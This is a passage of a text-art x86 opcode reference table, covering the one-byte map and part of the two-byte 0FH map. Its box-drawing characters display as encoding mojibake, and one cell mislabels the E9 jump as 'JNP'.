 ³  eAX   ³  eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³  eSI   ³  eDI   ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³  BOUND  ³  ARPL   ³   SEG   ³   SEG   ³ Operand³ Address³
6³ PUSHA  ³ POPA   ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³  Gv,Ma  ³  Ew,Rw  ³   =FS   ³   =GS   ³  Size  ³  Size  ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                  Short displacement jump of condition (Jb)                ³
7ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  JO    ³  JNO   ³   JB    ³   JNB   ³   JZ    ³  JNZ    ³   JBE  ³  JNBE  ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³ Immediate Grp1  ³         ³  Grp1   ³       TEST        ³      XCHG       ³
8ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´         ³         ÃÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³ Eb,Ib  ³ Ev,Iv  ³         ³  Ev,Iv  ³  Eb,Gb  ³  Ev,Gv  ³  Eb,Gb ³  Ev,Gv ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³        ³             XCHG word or double-word register with eAX           ³
9³  NOP   ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³        ³  eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³  eSI   ³  eDI   ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                MOV                  ³  MOVSB  ³ MOVSW/D ³ CMPSB  ³CMPSW/D ³
AÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´         ³         ³        ³        ³
 ³ AL,Ob  ³ eAX,Ov ³  Ob,AL  ³  Ov,eAX ³  Xb,Yb  ³  Xv,Yv  ³  Xb,Yb ³  Xv,Yv ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                     MOV immediate byte into byte register                 ³
BÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³   AL   ³  CL    ³   DL    ³   BL    ³   AH    ³   CH    ³   DH   ³   BH   ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³   Shift Grp2    ³      RET near     ³   LES   ³   LDS   ³       MOV       ³
CÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´         ³         ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³ Eb,Ib  ³ Ev,Iv  ³    Iw   ³         ³  Gv,Mp  ³  Gv,Mp  ³  Eb,Ib ³  Ev,Iv ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³             Shift Grp2              ³         ³         ³        ³        ³
DÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´   AAM   ³   AAD   ³        ³  XLAT  ³
 ³  Eb,1  ³ Ev,1   ³  Eb,CL  ³  Ev,CL  ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³ LOOPNE ³ LOOPE  ³   LOOP  ³  JCXZ   ³        IN         ³       OUT       ³
E³        ³        ³         ³         ÃÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  Jb    ³  Jb    ³    Jb   ³   Jb    ³  AL,Ib  ³ eAX,Ib  ³  Ib,AL ³ Ib,eAX ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³   REP   ³         ³         ³     Unary Grp3  ³
F³ LOCK   ³        ³  REPNE  ³         ³   HLT   ³   CMC   ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³  REPE   ³         ³         ³   Eb   ³   Ev   ³
 ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÙ


      8         9         A         B         C         D         E        F
 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ¿
 ³                           OR                            ³  PUSH  ³ 2-byte ³
0ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³        ³
 ³ Eb,Gb ³  Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³   CS   ³ escape ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                          SBB                            ³  PUSH  ³  POP   ³
1ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³        ³
 ³ Eb,Gb ³  Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³   DS   ³   DS   ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                          SUB                            ³  SEG   ³        ³
2ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³  DAS   ³
 ³ Eb,Gb ³  Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³  =CS   ³        ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                          CMP                            ³  SEG   ³        ³
3ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³  AAS   ³
 ³ Eb,Gb ³  Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³  =CS   ³        ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                            DEC general register                           ³
4ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  eAX  ³   eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³   eSI  ³  eDI   ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                        POP into general register                          ³
5ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  eAX  ³   eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³  eSI   ³  eDI   ³
 ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³ PUSH  ³  IMUL   ³  PUSH   ³  IMUL   ³  INSB   ³ INSW/D  ³ OUTSB  ³OUTSW/D ³
6³       ³         ³         ³         ³         ³         ³        ³        ³
 ³  Ib   ³ GvEvIv  ³   Ib    ³ GvEvIv  ³  Yb,DX  ³  Yb,DX  ³ Dx,Xb  ³ DX,Xv  ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                 Short-displacement jump on condition(Jb)                  ³
7ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  JS   ³   JNS   ³   JP    ³   JNP   ³   JL    ³  JNL    ³  JLE   ³  JNLE  ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³               MOV                   ³   MOV   ³   LEA   ³  MOV   ³  POP   ³
8ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´         ³         ³        ³        ³
 ³ Eb,Gb ³  Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  Ew,Sw  ³  Gv,M   ³  Sw,Ew ³   Ev   ³
 ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³       ³         ³  CALL   ³         ³  PUSHF  ³  POPF   ³        ³        ³
9³  CBW  ³   CWD   ³         ³  WAIT   ³         ³         ³  SAHF  ³  LAHF  ³
 ³       ³         ³   Ap    ³         ³   Fv    ³   Fv    ³        ³        ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³      TEST       ³  STOSB  ³ STOSW/D ³  LODSB  ³ LODSW/D ³ SCASB  ³SCASW/D ³
AÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´         ³         ³         ³         ³        ³        ³
 ³ AL,Ib ³ eAX,Iv  ³  Yb,AL  ³  Yv,eAX ³  AL,Xb  ³ eAX,Xv  ³  AL,Xb ³eAX,Xv  ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³      MOV immediate word or double into word or double register            ³
BÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  eAX  ³   eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³   eSI  ³  eDI   ³
 ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³ ENTER ³         ³      RET far      ³  INT    ³  INT    ³        ³        ³
C³       ³  LEAVE  ÃÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´         ³         ³  INTO  ³  IRET  ³
 ³ Iw,Ib ³         ³   Iw    ³         ³   3     ³  Ib     ³        ³        ³
 ÃÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                                                                           ³
D³                ESC(Escape to coprocessor instruction set)                 ³
 ³                                                                           ³
 ÃÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³  CALL ³             JNP             ³        IN         ³       OUT       ³
E³       ÃÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³   Av  ³   Jv    ³   Ap    ³   Jb    ³  AL,DX  ³ eAX,DX  ³ DX,AL  ³ DX,eAX ³
 ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³       ³         ³         ³         ³         ³         ³INC/DEC ³Indirct ³
F³  CLC  ³   STC   ³   CLI   ³   STI   ³   CLD   ³   STD   ³        ³        ³
 ³       ³         ³         ³         ³         ³         ³  Grp4  ³  Grp5  ³
 ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÙ


 Two-Byte Opcode Map (first byte is 0FH)
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

      0         1         2         3         4         5         6        7
 ÚÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ¿
 ³        ³        ³   LAR   ³   LSL   ³         ³         ³        ³        ³
0³  Grp6  ³ Grp7   ³         ³         ³         ³         ³  CLTS  ³        ³
 ³        ³        ³  Gw,Ew  ³  Gv,Ew  ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
1³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³   MOV  ³  MOV   ³   MOV   ³   MOV   ³   MOV   ³         ³   MOV  ³        ³
2³        ³        ³         ³         ³         ³         ³        ³        ³
 ³  Cd,Rd ³ Dd,Rd  ³  Rd,Cd  ³  Rd,Dd  ³  Td,Rd  ³         ³  Rd,Td ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
3³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
4³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
5³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
6³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
7³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                    Long-displacement jump on condition (Jv)               ³
8ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³   JO   ³  JNO   ³   JB    ³   JNB   ³   JZ    ³   JNZ   ³   JBE  ³  JNBE  ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                            Byte Set on condition (Eb)                     ³
9ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  SETO  ³ SETNO  ³  SETB   ³  SETNB  ³  SETZ   ³  SETNZ  ³  SETBE ³ SETNBE ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³  PUSH  ³  POP   ³         ³   BT    ³  SHLD   ³  SHLD   ³        ³        ³
A³        ³        ³         ³         ³         ³         ³        ³        ³
 ³   FS   ³  FS    ³         ³  Ev,Gv  ³ EvGvIb  ³ EvGvCL  ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³        ³        ³   LSS   ³   BTR   ³   LFS   ³   LGS   ³      MOVZX      ³
B³        ³        ³         ³         ³         ³         ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³        ³        ³   Mp    ³  Ev,Gv  ³   Mp    ³   Mp    ³ Gv,Eb  ³ Gv,Ew  ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
C³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
D³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
E³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
F³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÙ

      8         9         A         B         C         D        E        F
 ÚÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ¿
 ³        ³        ³         ³         ³         ³         ³        ³        ³
0³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
1³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
